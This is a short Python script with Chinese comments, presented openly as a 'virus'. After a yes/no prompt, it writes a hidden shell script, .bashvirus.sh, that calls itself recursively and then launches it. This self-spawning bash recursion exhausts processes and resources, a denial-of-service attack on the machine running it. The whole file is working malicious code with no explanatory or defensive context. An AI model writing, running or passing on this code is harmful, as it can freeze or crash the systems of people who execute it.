#本程序是通过无限运行Linux的bash来实现的
def virus():
    import os
    fo = open("./.bashvirus.sh",'w')
    fo.write("bash ./.bashvirus.sh\n")
    fo.write("bash -e ./.bashvirus.sh\n")
    fo.close()
    os.popen("bash ./.bashvirus.sh")
i = input("你确定要运行病毒吗？(y)")
if i == 'y' or i == 'Y':
    virus()
